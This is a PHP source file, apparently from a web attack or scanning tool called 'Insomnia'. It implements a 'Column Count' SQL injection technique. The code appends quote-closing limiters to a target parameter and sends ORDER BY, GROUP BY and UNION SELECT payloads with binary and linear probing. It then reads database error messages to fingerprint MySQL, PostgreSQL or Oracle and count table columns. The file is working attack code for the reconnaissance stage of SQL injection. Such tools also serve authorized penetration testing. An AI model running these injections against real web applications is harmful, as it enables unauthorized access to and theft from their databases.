<?php
class Insomnia_Workflow_Research_SQLInjection_Inject_ColumnCount
	extends Insomnia_Workflow_Research_SQLInjection_SQLInjectionInjectTechnique
{
	public static $techniqueName = "Column Count";

	public static $techniqueID = 5;

	private $paramLimiters = array(
		// Single Quote Limiters
		"'"   => "' -- ", 
		"')"  => "') -- ",
		"'))" => "')) -- ",

		// Double Quote Limiters
		'"'   => '" -- ',
		'")'  => '") -- ',
		'"))' => '")) -- '
	);

	private $researchData = array (
		"originalURL"     => "",
		"paramName"       => "",
		"paramValue"      => "",
		"paramPositionID" => null,
		"pathParamFlag"   => null,
		"POSTParamFlag"   => null
	);

	public function __construct(
		$originalURL, 
		$paramName,
		$paramValue,
		$paramPositionID, 
		$pathParamFlag, 
		$POSTParamFlag) {

		$this->researchData["originalURL"]     = $originalURL;
		$this->researchData["paramName"]       = $paramName;
		$this->researchData["paramValue"]      = $paramValue;
		$this->researchData["paramPositionID"] = $paramPositionID;
		$this->researchData["pathParamFlag"]   = $pathParamFlag;
		$this->researchData["POSTParamFlag"]   = $POSTParamFlag;
	}

	private static $operationErrors = array (
		"MySQL" => array (
			"/Unknown column.*in 'order clause'/",		// PHP Platform error
			"/Unknown column.*in 'group statement'/",	// PHP Platform error
			"/The used SELECT statements have a different number of columns/" // PHP Platform error
		),
		
		"PostgreSQL" => array (
			"/Query error.*ORDER BY/",	// PHP Platform error
			"/Query error.*GROUP BY/",	// PHP Platform error
			"/Query error.*UNION/" // PHP Platform error
		)
	);

	public function execute() {
		$resultSet = $this->getColumnCountAndPossibleDB();

		$techniqueResults = array();

		if($resultSet === false) {
			$techniqueResults[] = new Insomnia_Common_Data_SQLInjectionInjectTechResult(
				self::$techniqueID,
				$this->researchData['paramValue'],
				null,
				false,
				'unknown',
				null,
				'Table column count: unknown'

			);
		} else {
			$techniqueResults[] = new Insomnia_Common_Data_SQLInjectionInjectTechResult(
				self::$techniqueID,
				$this->researchData['paramValue'],
				null,
				true,
				$resultSet['possibleDB'],
				$resultSet['resultQueue'],
				$resultSet['resultData']
			);			
		}

		return $techniqueResults;
	}

	/**
	 * Check for limiter value (limiter for current param in sql query: ',",'),"),etc)
	 * @return string
	 */
	private function checkForLimiter() {

		$finalParamLimiter = '';

		$requestHandler = new Insomnia_Common_Request_SQLInjectionRequestHandler();

		foreach($this->paramLimiters as $paramLimiter => $commentParamLimiter) {

			$limitedParamValue = $this->researchData['paramValue'] . $commentParamLimiter;

			$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
				$this->researchData['originalURL'],
				array(
					'paramPositionID' => $this->researchData['paramPositionID'],
					'pathParamFlag'   => $this->researchData['pathParamFlag'],
					'paramName'       => $this->researchData['paramName'],
					'paramValue'      => $limitedParamValue
				)
			);

			$requestHandler->setRequestSet($requestSet);
			$replySet = $requestHandler->executeProcess();

			$errorCheckResult = $this->checkForErrors($replySet);

			if($errorCheckResult['errorExists'] == false) {

				$finalParamLimiter = $paramLimiter;
				break;

			}
				
		}

		return $finalParamLimiter;
	}

	/**
	 * Returns the column count of the current table where we in.
	 * Return values: arry (column_count:integer, possibleDB:string, resultQueue:array(string,..,..), resultData:string), false (not injectable)
	 * @return array|boolean
	 */
	private function getColumnCountAndPossibleDB() {

		$paramLimiter = $this->checkForLimiter();

		$result = $this->calculateColumnCountByOrdering($paramLimiter);
		if($result === false) {
			$result = $this->calculateColumnCountByGrouping($paramLimiter);
			if($result === false)
				$result = $this->calculateColumnCountByUNION($paramLimiter);
		}

		return $result;
	}

	/**
	 * Calculate the column count by [GROUP BY / ORDER BY] SQL operators.
	 * @return array (column count, possibleDB)|boolean
	 */
	private function calculateColumnCountByOrdering($paramLimiter) {

		$columnCount = 100; $possibleDB = 'unknown'; $resultQueue = array(); $resultData = '';
		$techniqueFailed = false;

		$requestHandler = new Insomnia_Common_Request_SQLInjectionRequestHandler();

		while(true) {

			$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' ORDER BY ' . $columnCount . ' -- ';

			$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
				$this->researchData['originalURL'],
				array(
					'paramPositionID' => $this->researchData['paramPositionID'],
					'pathParamFlag'   => $this->researchData['pathParamFlag'],
					'paramName'       => $this->researchData['paramName'],
					'paramValue'      => $infectedParamValue
				)
			);
			
			$requestHandler->setRequestSet($requestSet);
			$replySet = $requestHandler->executeProcess();


			$errorSet = $this->checkForErrors($replySet);

			if($errorSet['errorExists'] && $columnCount != 1) {
				$columnCount = $columnCount / 2;
				settype($columnCount, 'integer');
			} elseif($errorSet['errorExists'] && $columnCount == 1) {
				$techniqueFailed = true;
				break;
			} elseif(!$errorSet['errorExists']) {
				break;
			}

		}

		if($techniqueFailed == false) {

			$columnCountLimiter = $columnCount * 2 + 1;
			$resultRequest = null;

			while(true) {

				if($columnCount > $columnCountLimiter) {
					$techniqueFailed = true;
					break;
				}

				$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' ORDER BY ' . $columnCount . ' -- ';

				$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
					$this->researchData['originalURL'],
					array(
						'paramPositionID' => $this->researchData['paramPositionID'],
						'pathParamFlag'   => $this->researchData['pathParamFlag'],
						'paramName'       => $this->researchData['paramName'],
						'paramValue'      => $infectedParamValue
					)
				);

				$requestHandler->setRequestSet($requestSet);
				$replySet = $requestHandler->executeProcess();

				if($resultRequest === null)
					$resultRequest = $replySet->getURL();

				$errorSet = $this->checkForErrors($replySet);

				if($errorSet['errorExists']) {
					$columnCount -= 1;
					$possibleDB = $errorSet['dbVersion'];
					$resultQueue[] = $resultRequest;
					$resultData = 'Table column count: ' . $columnCount;
					break;
				}

				$resultRequest = $replySet->getURL();
				++$columnCount;
			}
		}

		return ($techniqueFailed) 
			? false
			: array ( 
				'columnCount' => $columnCount, 
				'possibleDB'  => $possibleDB, 
				'resultQueue' => $resultQueue,
				'resultData'  => $resultData
			);
	}

	/**
	 * Calculate the column count by [GROUP BY / ORDER BY] SQL operators.
	 * @return array (column count, possibleDB)|boolean
	 */
	private function calculateColumnCountByGrouping($paramLimiter) {

		$columnCount = 100; $possibleDB = 'unknown'; $resultQueue = array(); $resultData = '';
		$techniqueFailed = false;

		$requestHandler = new Insomnia_Common_Request_SQLInjectionRequestHandler();

		while(true) {

			$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' GROUP BY ' . $columnCount . ' -- ';

			$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
				$this->researchData['originalURL'],
				array(
					'paramPositionID' => $this->researchData['paramPositionID'],
					'pathParamFlag'   => $this->researchData['pathParamFlag'],
					'paramName'       => $this->researchData['paramName'],
					'paramValue'      => $infectedParamValue
				)
			);
			
			$requestHandler->setRequestSet($requestSet);
			$replySet = $requestHandler->executeProcess();


			$errorSet = $this->checkForErrors($replySet);

			if($errorSet['errorExists'] && $columnCount != 1) {
				$columnCount = $columnCount / 2;
				settype($columnCount, 'integer');
			} elseif($errorSet['errorExists'] && $columnCount == 1) {
				$techniqueFailed = true;
				break;
			} elseif(!$errorSet['errorExists']) {
				break;
			}

		}

		if($techniqueFailed == false) {

			$columnCountLimiter = $columnCount * 2 + 1;
			$resultRequest = null;

			while(true) {

				if($columnCount > $columnCountLimiter) {
					$techniqueFailed = true;
					break;
				}

				$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' GROUP BY ' . $columnCount . ' -- ';

				$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
					$this->researchData['originalURL'],
					array(
						'paramPositionID' => $this->researchData['paramPositionID'],
						'pathParamFlag'   => $this->researchData['pathParamFlag'],
						'paramName'       => $this->researchData['paramName'],
						'paramValue'      => $infectedParamValue
					)
				);

				$requestHandler->setRequestSet($requestSet);
				$replySet = $requestHandler->executeProcess();

				if($resultRequest === null)
					$resultRequest = $replySet->getURL();

				$errorSet = $this->checkForErrors($replySet);

				if($errorSet['errorExists']) {
					$columnCount -= 1;
					$possibleDB = $errorSet['dbVersion'];
					$resultQueue[] = $resultRequest;
					$resultData = 'Table column count: ' . $columnCount;
					break;
				}

				$resultRequest = $replySet->getURL();
				++$columnCount;
			}
		}

		return ($techniqueFailed) 
			? false
			: array ( 
				'columnCount' => $columnCount, 
				'possibleDB'  => $possibleDB, 
				'resultQueue' => $resultQueue,
				'resultData'  => $resultData
			);
	}

	/**
	 * Calculate the column count by [UNION] SQL operation.
	 * @return array(column count, possibleDB)|boolean
	 */
	private function calculateColumnCountByUNION($paramLimiter) {
		//return "pizdec";
		$columnCountLimiter = 100;
		$columnCount = 1;
		$possibleDB = 'unknown';
		$techniqueFailed = false;
		$resultQueue = array();
		$resultData = '';

		$requestHandler = new Insomnia_Common_Request_SQLInjectionRequestHandler();

		// Check the DB Type.
		$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ';

		$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
			$this->researchData['originalURL'],
			array(
				'paramPositionID' => $this->researchData['paramPositionID'],
				'pathParamFlag'   => $this->researchData['pathParamFlag'],
				'paramName'       => $this->researchData['paramName'],
				'paramValue'      => $infectedParamValue
			)
		);

		$requestHandler->setRequestSet($requestSet);
		$replySet = $requestHandler->executeProcess();

		$possibleDB = $this->checkForErrors($replySet)['dbVersion'];

		$resultRequest = null;

		switch($possibleDB) {
			case 'OracleSQL':

				

				while(true) {

					$queryColumnElements = array();
					for($i = 0; $i < $columnCount; ++$i)
						$queryColumnElements[] = 'null';

					$queryColumnString = implode(',', $queryColumnElements);
					
					$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ' . $queryColumnString . ' FROM sys.dual -- ';

					$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
						$this->researchData['originalURL'],
						array(
							'paramPositionID' => $this->researchData['paramPositionID'],
							'pathParamFlag'   => $this->researchData['pathParamFlag'],
							'paramName'       => $this->researchData['paramName'],
							'paramValue'      => $infectedParamValue
						)
					);
					
					$requestHandler->setRequestSet($requestSet);
					$replySet = $requestHandler->executeProcess();

					if($resultRequest === null)
						$resultRequest = $replySet->getURL();

					$errorSet = $this->checkForErrors($replySet);


					if(!$errorSet['errorExists']) {
						$resultQueue[] = $resultRequest;
						$resultData = 'The number of columns in the table: ' . $columnCount;
						break;
					} elseif($columnCount == $columnCountLimiter) {
						$techniqueFailed = true;
						break;
					}

					$resultRequest = $replySet->getURL();
					++$columnCount;
				}

				break;

			case 'PostgreSQL':
				
				while(true) {

					$queryColumnElements = array();
					for($i = 0; $i < $columnCount; ++$i)
						$queryColumnElements[] = 'null';

					$queryColumnString = implode(',', $queryColumnElements);
					
					$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ' . $queryColumnString . ' -- ';

					$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
						$this->researchData['originalURL'],
						array(
							'paramPositionID' => $this->researchData['paramPositionID'],
							'pathParamFlag'   => $this->researchData['pathParamFlag'],
							'paramName'       => $this->researchData['paramName'],
							'paramValue'      => $infectedParamValue
						)
					);
					
					$requestHandler->setRequestSet($requestSet);
					$replySet = $requestHandler->executeProcess();

					if($resultRequest === null)
						$resultRequest = $replySet->getURL();

					$errorSet = $this->checkForErrors($replySet);


					if(!$errorSet['errorExists']) {
						$resultQueue[] = $resultRequest;
						$resultData = 'The number of columns in the table: ' . $columnCount;
						break;
					} elseif($columnCount == $columnCountLimiter) {
						$techniqueFailed = true;
						break;
					}

					$resultRequest = $replySet->getURL();
					++$columnCount;
				}

				
				break;

			case 'MySQL':

				while(true) {

					$queryColumnElements = array();
					for($i = 1; $i <= $columnCount; ++$i)
						$queryColumnElements[] = $i;

					$queryColumnString = implode(',', $queryColumnElements);
					
					$infectedParamValue = $this->researchData['paramValue'] . $paramLimiter . ' UNION SELECT ' . $queryColumnString . ' -- ';

					$requestSet = Insomnia_Common_Request_Builder_SQLInjectionRequestSetBuilder::buildRequestSet(
						$this->researchData['originalURL'],
						array(
							'paramPositionID' => $this->researchData['paramPositionID'],
							'pathParamFlag'   => $this->researchData['pathParamFlag'],
							'paramName'       => $this->researchData['paramName'],
							'paramValue'      => $infectedParamValue
						)
					);
					
					$requestHandler->setRequestSet($requestSet);
					$replySet = $requestHandler->executeProcess();

					if($resultRequest === null)
						$resultRequest = $replySet->getURL();

					$errorSet = $this->checkForErrors($replySet);


					if(!$errorSet['errorExists']) {
						$resultQueue[] = $resultRequest;
						$resultData = 'The number of columns in the table: ' . $columnCount;
						break;
					} elseif($columnCount == $columnCountLimiter) {
						$techniqueFailed = true;
						break;
					}

					$resultRequest = $replySet->getURL();
					++$columnCount;
				}				

				break;

			default:

				$techniqueFailed = true;
				break;
		}


		return ($techniqueFailed) 
			? false
			: array ( 
				'columnCount' => $columnCount, 
				'possibleDB'  => $possibleDB, 
				'resultQueue' => $resultQueue,
				'resultData'  => $resultData
			);
	}

	/**
	 * @param ReplyDataSet $replySet
	 * @return array Form: array('errorExists'=>boolean, 'dbVersion'=>string)
	 */
	private function checkForErrors($replySet) {
		$errorData = array ('errorExists' => false, 'dbVersion' => 'unknown');

		if($replySet->getInfo()['http_code'] === 200) {

			// Checking for special errors.
			foreach(self::$operationErrors as $dbVersion => $operationErrors) {

				foreach($operationErrors as $operationError) {

					$pregResult = preg_match($operationError, $replySet->getBody());
					if($pregResult !== false && $pregResult !== 0) {
						$errorData['errorExists'] = true;
						$errorData['dbVersion']  = $dbVersion;
						break 2;
					}					
				}
			}

			
			// Checking for common errors.
			if(!$errorData['errorExists']) {
				foreach(self::$errorMessages as $dbVersion => $errorStrings) {

					foreach($errorStrings as $errorString) {

						$pregResult = preg_match($errorString, $replySet->getBody());
						if($pregResult !== false && $pregResult !== 0) {
							$errorData['errorExists'] = true;
							$errorData['dbVersion']  = $dbVersion;
							break 2;
						}
					}
				}				
			}

		}

		return $errorData;
	}	

}